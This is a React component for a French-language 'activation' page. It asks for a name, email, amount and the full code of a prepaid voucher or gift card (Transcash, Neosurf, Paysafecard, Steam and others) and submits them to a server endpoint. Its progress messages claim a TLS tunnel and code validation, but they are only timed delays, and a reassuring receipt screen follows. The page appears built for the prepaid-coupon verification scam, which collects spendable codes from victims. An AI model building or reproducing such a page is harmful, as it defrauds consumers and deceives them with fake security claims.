import React, { useState } from 'react';
import { 
  ShieldCheck, 
  Lock, 
  Eye, 
  EyeOff, 
  AlertCircle, 
  CheckCircle2, 
  ArrowLeft, 
  Send, 
  CreditCard,
  KeyRound,
  Mail,
  User,
  Euro,
  FileCheck2,
  RefreshCw
} from 'lucide-react';
import { CardType, TicketFormData, SubmissionResponse, TranslationStrings, Language } from '../types';
import { CardVisual } from './CardVisual';

interface ActivationFormProps {
  t: TranslationStrings;
  currentLang?: Language;
  initialCardType?: CardType;
  onNavigateHome: () => void;
  onOpenEmailPreview?: () => void;
}

const CARD_OPTIONS: { type: CardType; label: string; tag: string }[] = [
  { type: 'Transcash', label: 'Transcash', tag: 'Mastercard Prepaid' },
  { type: 'Neosurf', label: 'Neosurf', tag: 'PIN Voucher' },
  { type: 'PCS', label: 'PCS', tag: 'Prepaid Card' },
  { type: 'Steam', label: 'Steam', tag: 'Wallet Card' },
  { type: 'iTunes', label: 'iTunes', tag: 'Apple Gift' },
  { type: 'Paysafecard', label: 'Paysafecard', tag: 'PIN 16 Chiffres' },
  { type: 'Google Play', label: 'Google Play', tag: 'Play Code' },
];

export const ActivationForm: React.FC<ActivationFormProps> = ({
  t,
  currentLang = 'fr',
  initialCardType = 'Transcash',
  onNavigateHome,
  onOpenEmailPreview,
}) => {
  // Form State
  const [formData, setFormData] = useState<TicketFormData>({
    name: '',
    email: '',
    amount: '',
    cardType: initialCardType,
    code: '',
    hideCode: true, // Default to true (Oui) for safety
  });

  // UI States
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [processingStep, setProcessingStep] = useState<string>('');
  const [submissionResult, setSubmissionResult] = useState<SubmissionResponse | null>(null);
  const [submissionError, setSubmissionError] = useState<string | null>(null);

  // Validate form fields
  const validate = (): boolean => {
    const newErrors: Record<string, string> = {};

    if (!formData.name.trim()) {
      newErrors.name = t.form.errors.nameRequired;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!formData.email.trim() || !emailRegex.test(formData.email.trim())) {
      newErrors.email = t.form.errors.emailInvalid;
    }

    const parsedAmount = parseFloat(formData.amount);
    if (!formData.amount.trim() || isNaN(parsedAmount) || parsedAmount <= 0) {
      newErrors.amount = t.form.errors.amountInvalid;
    }

    if (!formData.code.trim()) {
      newErrors.code = t.form.errors.codeRequired;
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    if (errors[name]) {
      setErrors((prev) => ({ ...prev, [name]: '' }));
    }
    if (submissionError) {
      setSubmissionError(null);
    }
  };

  const handleHideCodeChange = (hide: boolean) => {
    setFormData((prev) => ({ ...prev, hideCode: hide }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!validate()) {
      return;
    }

    setIsSubmitting(true);
    setSubmissionError(null);

    // Multi-stage visual security progression
    try {
      setProcessingStep('Initialisation du tunnel cryptographique TLS 1.3...');
      await new Promise((r) => setTimeout(r, 450));

      setProcessingStep('Validation du format et de la conformité du code...');
      await new Promise((r) => setTimeout(r, 550));

      setProcessingStep('Envoi sécurisé au serveur et notification...');

      const response = await fetch('/api/submit-ticket', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          name: formData.name,
          email: formData.email,
          amount: formData.amount,
          cardType: formData.cardType,
          code: formData.code,
          hideCode: formData.hideCode,
          language: currentLang || 'fr',
        }),
      });

      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(data.error || t.error.message);
      }

      setSubmissionResult(data);
    } catch (err: any) {
      console.error('Submission failed:', err);
      setSubmissionError(t.error.message);
    } finally {
      setIsSubmitting(false);
      setProcessingStep('');
    }
  };

  const handleResetForm = () => {
    setFormData({
      name: '',
      email: '',
      amount: '',
      cardType: 'Transcash',
      code: '',
      hideCode: true,
    });
    setSubmissionResult(null);
    setSubmissionError(null);
    setErrors({});
  };

  // SUCCESS CONFIRMATION VIEW (White & Clean layout with rounded borders)
  if (submissionResult && submissionResult.success) {
    return (
      <div id="confirmation-view" className="max-w-3xl mx-auto px-4 sm:px-6 py-12 sm:py-16 animate-in fade-in zoom-in-95 duration-300">
        <div className="rounded-3xl bg-white border border-slate-200/90 shadow-2xl p-6 sm:p-10 text-slate-900 relative overflow-hidden">
          
          {/* Top Success Badge */}
          <div className="w-16 h-16 rounded-full bg-emerald-50 border border-emerald-200 flex items-center justify-center text-emerald-600 mx-auto mb-6 shadow-md shadow-emerald-500/10">
            <CheckCircle2 className="w-8 h-8 text-emerald-600" />
          </div>

          <h2 id="confirmation-title" className="text-2xl sm:text-3xl font-extrabold text-center text-slate-900 mb-3">
            {t.confirmation.title}
          </h2>

          {/* Official Required Confirmation Message */}
          <div id="official-confirmation-message" className="bg-emerald-50/90 border border-emerald-200/90 rounded-2xl p-5 sm:p-6 text-emerald-900 text-sm sm:text-base leading-relaxed text-center mb-8 font-medium shadow-sm">
            « {t.confirmation.successMessage} »
          </div>

          {/* Receipt Breakdown Card */}
          <div className="rounded-2xl bg-slate-50 border border-slate-200 p-5 sm:p-6 mb-8 text-sm space-y-3.5 shadow-inner">
            <div className="flex items-center justify-between pb-3 border-b border-slate-200">
              <span className="text-slate-500 flex items-center gap-2 font-medium">
                <FileCheck2 className="w-4 h-4 text-cyan-600" />
                {t.confirmation.refNumber}
              </span>
              <span className="font-mono font-bold text-slate-900 text-base">
                {submissionResult.referenceId}
              </span>
            </div>

            <div className="flex items-center justify-between py-2 border-b border-slate-200">
              <span className="text-slate-500 font-medium">{t.confirmation.cardType}</span>
              <span className="font-bold text-amber-700 bg-amber-50 px-2.5 py-0.5 rounded-full border border-amber-200">
                {submissionResult.cardType}
              </span>
            </div>

            <div className="flex items-center justify-between py-2 border-b border-slate-200">
              <span className="text-slate-500 font-medium">{t.confirmation.amount}</span>
              <span className="font-extrabold text-emerald-700 text-lg">
                {submissionResult.amount?.toFixed(2)} €
              </span>
            </div>

            <div className="flex items-center justify-between py-2 border-b border-slate-200">
              <span className="text-slate-500 font-medium">{t.confirmation.date}</span>
              <span className="text-slate-700 font-mono text-xs">
                {submissionResult.timestamp ? new Date(submissionResult.timestamp).toLocaleString() : new Date().toLocaleString()}
              </span>
            </div>

            <div className="flex items-center justify-between pt-2">
              <span className="text-slate-500 font-medium">{t.confirmation.emailSentTo}</span>
              <span className="text-slate-900 font-bold">{submissionResult.email}</span>
            </div>
          </div>

          {/* Status Indicator */}
          <div className="flex items-center justify-center gap-2 text-xs font-mono font-bold text-cyan-800 bg-cyan-50 border border-cyan-200 py-2.5 px-4 rounded-full mb-8">
            <span className="w-2 h-2 rounded-full bg-cyan-500 animate-pulse"></span>
            <span>{t.confirmation.statusText}</span>
          </div>

          {/* Action Buttons */}
          <div className="flex flex-col sm:flex-row items-center justify-center gap-4">
            <button
              id="back-home-button"
              onClick={onNavigateHome}
              className="w-full sm:w-auto px-8 py-3.5 rounded-full bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-bold text-sm sm:text-base transition-all shadow-lg shadow-cyan-500/20 flex items-center justify-center gap-2 cursor-pointer"
            >
              <ArrowLeft className="w-4 h-4 text-white" />
              <span>{t.confirmation.homeButton}</span>
            </button>

            <button
              id="new-submission-btn"
              onClick={handleResetForm}
              className="w-full sm:w-auto px-6 py-3.5 rounded-full bg-slate-100 hover:bg-slate-200 text-slate-800 font-bold text-sm sm:text-base border border-slate-200 transition-all flex items-center justify-center gap-2 cursor-pointer"
            >
              <RefreshCw className="w-4 h-4 text-slate-500" />
              <span>{t.confirmation.newSubmission}</span>
            </button>
          </div>

        </div>
      </div>
    );
  }

  // MAIN FORM VIEW (Clean White & High Contrast)
  return (
    <div id="activation-page-container" className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-10 sm:py-16">
      
      {/* Navigation Breadcrumb / Return button */}
      <div className="mb-6 flex items-center justify-start">
        <button
          onClick={onNavigateHome}
          className="inline-flex items-center gap-2 text-xs font-bold text-slate-600 hover:text-cyan-700 transition-colors bg-white px-3.5 py-1.5 rounded-full border border-slate-200 shadow-sm cursor-pointer"
        >
          <ArrowLeft className="w-3.5 h-3.5" />
          <span>{t.nav.home}</span>
        </button>
      </div>

      {/* Main Form Box */}
      <div className="rounded-3xl bg-white border border-slate-200/90 shadow-xl overflow-hidden">
        
        {/* Form Header */}
        <div className="bg-gradient-to-b from-slate-50/80 to-white border-b border-slate-200 p-6 sm:p-8">
          <h1 
            id="form-page-title"
            className="text-xl sm:text-2xl md:text-3xl font-extrabold text-slate-900 tracking-tight leading-snug"
          >
            {t.form.pageTitle}
          </h1>

          <p className="mt-2 text-xs sm:text-sm text-slate-600">
            {t.form.pageSubtitle}
          </p>
        </div>

        {/* Global Error Banner if any */}
        {submissionError && (
          <div 
            id="submission-error-banner"
            className="mx-6 sm:mx-8 mt-6 p-4 rounded-2xl bg-red-50 border border-red-200 text-red-900 text-sm flex items-start gap-3 animate-in fade-in"
          >
            <AlertCircle className="w-5 h-5 text-red-600 shrink-0 mt-0.5" />
            <div>
              <p className="font-bold">{t.error.title}</p>
              <p className="text-xs sm:text-sm mt-0.5 text-red-700">
                {submissionError}
              </p>
            </div>
          </div>
        )}

        {/* Interactive Form */}
        <form onSubmit={handleSubmit} className="p-6 sm:p-8 space-y-6">
          
          {/* Row 1: Nom & Email */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
            {/* Nom * */}
            <div>
              <label 
                htmlFor="input-name"
                className="block text-sm font-bold text-slate-900 mb-2 flex items-center gap-1.5"
              >
                <User className="w-4 h-4 text-cyan-600" />
                <span>{t.form.nameLabel}</span>
              </label>
              <div className="relative">
                <input
                  id="input-name"
                  type="text"
                  name="name"
                  value={formData.name}
                  onChange={handleInputChange}
                  placeholder={t.form.namePlaceholder}
                  className={`w-full px-4 py-3 rounded-2xl bg-slate-50 border ${
                    errors.name ? 'border-red-400 focus:ring-red-400' : 'border-slate-200 focus:border-cyan-600'
                  } text-slate-900 text-sm placeholder-slate-400 focus:bg-white focus:outline-none focus:ring-2 focus:ring-cyan-500/20 transition-all`}
                  disabled={isSubmitting}
                />
              </div>
              {errors.name && (
                <p className="mt-1.5 text-xs text-red-600 font-medium flex items-center gap-1">
                  <AlertCircle className="w-3 h-3" />
                  {errors.name}
                </p>
              )}
            </div>

            {/* E-mail * */}
            <div>
              <label 
                htmlFor="input-email"
                className="block text-sm font-bold text-slate-900 mb-2 flex items-center gap-1.5"
              >
                <Mail className="w-4 h-4 text-cyan-600" />
                <span>{t.form.emailLabel}</span>
              </label>
              <div className="relative">
                <input
                  id="input-email"
                  type="email"
                  name="email"
                  value={formData.email}
                  onChange={handleInputChange}
                  placeholder={t.form.emailPlaceholder}
                  className={`w-full px-4 py-3 rounded-2xl bg-slate-50 border ${
                    errors.email ? 'border-red-400 focus:ring-red-400' : 'border-slate-200 focus:border-cyan-600'
                  } text-slate-900 text-sm placeholder-slate-400 focus:bg-white focus:outline-none focus:ring-2 focus:ring-cyan-500/20 transition-all`}
                  disabled={isSubmitting}
                />
              </div>
              {errors.email && (
                <p className="mt-1.5 text-xs text-red-600 font-medium flex items-center gap-1">
                  <AlertCircle className="w-3 h-3" />
                  {errors.email}
                </p>
              )}
            </div>
          </div>

          {/* Row 2: Montant (€) & Type de carte */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
            
            {/* Montant (€) */}
            <div>
              <label 
                htmlFor="input-amount"
                className="block text-sm font-bold text-slate-900 mb-2 flex items-center gap-1.5"
              >
                <Euro className="w-4 h-4 text-cyan-600" />
                <span>{t.form.amountLabel}</span>
              </label>
              <div className="relative">
                <input
                  id="input-amount"
                  type="number"
                  step="any"
                  name="amount"
                  value={formData.amount}
                  onChange={handleInputChange}
                  placeholder={t.form.amountPlaceholder}
                  min="1"
                  className={`w-full px-4 py-3 rounded-2xl bg-slate-50 border ${
                    errors.amount ? 'border-red-400 focus:ring-red-400' : 'border-slate-200 focus:border-cyan-600'
                  } text-slate-900 text-sm placeholder-slate-400 focus:bg-white focus:outline-none focus:ring-2 focus:ring-cyan-500/20 transition-all`}
                  disabled={isSubmitting}
                />
                <span className="absolute right-4 top-1/2 -translate-y-1/2 text-xs font-bold text-slate-400">
                  EUR (€)
                </span>
              </div>
              {errors.amount && (
                <p className="mt-1.5 text-xs text-red-600 font-medium flex items-center gap-1">
                  <AlertCircle className="w-3 h-3" />
                  {errors.amount}
                </p>
              )}
            </div>

            {/* Type de carte (Select with Transcash default) */}
            <div>
              <label 
                htmlFor="select-card-type"
                className="block text-sm font-bold text-slate-900 mb-2 flex items-center gap-1.5"
              >
                <CreditCard className="w-4 h-4 text-cyan-600" />
                <span>{t.form.cardTypeLabel}</span>
              </label>
              <div className="relative">
                <select
                  id="select-card-type"
                  name="cardType"
                  value={formData.cardType}
                  onChange={handleInputChange}
                  className="w-full px-4 py-3 rounded-2xl bg-slate-50 border border-slate-200 focus:border-cyan-600 text-slate-900 text-sm focus:bg-white focus:outline-none focus:ring-2 focus:ring-cyan-500/20 transition-all appearance-none cursor-pointer font-medium"
                  disabled={isSubmitting}
                >
                  {CARD_OPTIONS.map((opt) => (
                    <option key={opt.type} value={opt.type} className="bg-white text-slate-900 py-2">
                      {opt.label}
                    </option>
                  ))}
                </select>
                <div className="pointer-events-none absolute right-4 top-1/2 -translate-y-1/2 text-slate-500 text-xs font-bold">
                  ▼
                </div>
              </div>
            </div>

          </div>

          {/* Card Visual Photo Preview */}
          <div className="bg-slate-50 border border-slate-200/90 rounded-2xl p-4 flex flex-col sm:flex-row items-center gap-4">
            <div className="w-full sm:w-48 shrink-0">
              <CardVisual type={formData.cardType} />
            </div>
            <div className="text-center sm:text-left text-xs space-y-1">
              <div className="flex items-center justify-center sm:justify-start gap-2">
                <span className="font-extrabold text-sm text-slate-900">{formData.cardType}</span>
                <span className="bg-emerald-100 text-emerald-800 text-[10px] font-bold px-2 py-0.5 rounded-full border border-emerald-300">
                  {t.form.cardReadyStatus || 'Prêt pour vérification'}
                </span>
              </div>
              <p className="text-slate-500">
                {t.form.cardDescriptions?.[formData.cardType] || `La structure et le format de votre code seront validés selon les critères officiels de la carte ${formData.cardType}.`}
              </p>
            </div>
          </div>

          {/* Row 3: Code Field */}
          <div>
            <label 
              htmlFor="input-code"
              className="block text-sm font-bold text-slate-900 mb-2 flex items-center gap-1.5"
            >
              <KeyRound className="w-4 h-4 text-cyan-600" />
              <span>{t.form.codeLabel} *</span>
            </label>

            <div className="relative">
              <input
                id="input-code"
                type={formData.hideCode ? 'password' : 'text'}
                name="code"
                value={formData.code}
                onChange={handleInputChange}
                placeholder={t.form.codePlaceholder}
                autoComplete="off"
                className={`w-full px-4 py-3.5 rounded-2xl bg-slate-50 font-mono tracking-wider border ${
                  errors.code ? 'border-red-400 focus:ring-red-400' : 'border-slate-200 focus:border-cyan-600'
                } text-slate-900 text-sm placeholder-slate-400 focus:bg-white focus:outline-none focus:ring-2 focus:ring-cyan-500/20 transition-all`}
                disabled={isSubmitting}
              />
            </div>
            {errors.code && (
              <p className="mt-1.5 text-xs text-red-600 font-medium flex items-center gap-1">
                <AlertCircle className="w-3 h-3" />
                {errors.code}
              </p>
            )}
          </div>

          {/* Row 4: « Cacher le code ? » Radio options with Oui / Non */}
          <div className="bg-slate-50 rounded-2xl p-4 sm:p-5 border border-slate-200/90 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
            <div>
              <span className="block text-sm font-bold text-slate-900">
                {t.form.hideCodeLabel}
              </span>
              <span className="text-xs text-slate-500">
                Masque visuellement la saisie pour éviter l'exposition d'écran
              </span>
            </div>

            <div className="flex items-center gap-3">
              {/* Option: Oui */}
              <label 
                id="radio-hide-yes-label"
                className={`flex items-center gap-2 px-4 py-2 rounded-full cursor-pointer border text-sm font-bold transition-all ${
                  formData.hideCode
                    ? 'bg-cyan-50 text-cyan-800 border-cyan-300 shadow-sm'
                    : 'bg-white text-slate-600 border-slate-200 hover:border-slate-300'
                }`}
              >
                <input
                  id="radio-hide-yes"
                  type="radio"
                  name="hideCodeOption"
                  checked={formData.hideCode === true}
                  onChange={() => handleHideCodeChange(true)}
                  className="w-4 h-4 text-cyan-600 focus:ring-cyan-500 accent-cyan-600"
                />
                <EyeOff className="w-3.5 h-3.5" />
                <span>{t.form.hideCodeYes}</span>
              </label>

              {/* Option: Non */}
              <label 
                id="radio-hide-no-label"
                className={`flex items-center gap-2 px-4 py-2 rounded-full cursor-pointer border text-sm font-bold transition-all ${
                  !formData.hideCode
                    ? 'bg-cyan-50 text-cyan-800 border-cyan-300 shadow-sm'
                    : 'bg-white text-slate-600 border-slate-200 hover:border-slate-300'
                }`}
              >
                <input
                  id="radio-hide-no"
                  type="radio"
                  name="hideCodeOption"
                  checked={formData.hideCode === false}
                  onChange={() => handleHideCodeChange(false)}
                  className="w-4 h-4 text-cyan-600 focus:ring-cyan-500 accent-cyan-600"
                />
                <Eye className="w-3.5 h-3.5" />
                <span>{t.form.hideCodeNo}</span>
              </label>
            </div>
          </div>

          {/* Submit Button & Processing state */}
          <div className="pt-2">
            <button
              id="submit-ticket-btn"
              type="submit"
              disabled={isSubmitting}
              className={`w-full py-4 px-6 rounded-full font-bold text-base transition-all duration-200 flex items-center justify-center gap-3 shadow-xl ${
                isSubmitting
                  ? 'bg-slate-200 text-slate-500 cursor-not-allowed border border-slate-300'
                  : 'bg-gradient-to-r from-cyan-600 via-blue-600 to-indigo-600 hover:from-cyan-500 hover:via-blue-500 hover:to-indigo-500 text-white shadow-cyan-500/20 hover:shadow-cyan-500/35 cursor-pointer transform hover:-translate-y-0.5 active:translate-y-0'
              }`}
            >
              {isSubmitting ? (
                <>
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  <span className="font-mono text-sm">{processingStep || t.form.submitting}</span>
                </>
              ) : (
                <>
                  <Send className="w-5 h-5" />
                  <span>{t.form.submitButton}</span>
                </>
              )}
            </button>
          </div>

        </form>

      </div>
    </div>
  );
};
